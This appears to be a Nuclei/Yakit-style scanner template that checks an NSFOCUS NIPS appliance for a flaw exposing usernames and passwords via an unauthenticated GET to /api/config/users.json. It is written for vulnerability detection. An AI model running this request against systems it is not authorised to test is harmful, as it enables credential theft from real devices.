script_name: NIPS 系统users.json敏感信息泄漏漏洞
content:
id: NIPS 系统users.json敏感信息泄漏漏洞

info:
  name: NIPS 系统users.json敏感信息泄漏漏洞
  author: Deans
  severity: high
  description: 绿盟网络入侵防护系统某版本存在敏感信息泄露漏洞，通过访问https://ip/api/config/users.json，即可获取NIPS的用户名及密码等信息
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 1671bcc4e8625d6e7658c13688a7d93d

http:
- raw:
  - |+
    @timeout: 30s
    GET /api/config/users.json HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - '"auth_method"'
    - '"password"'
    - '"passwd_chgTime"'
    condition: and
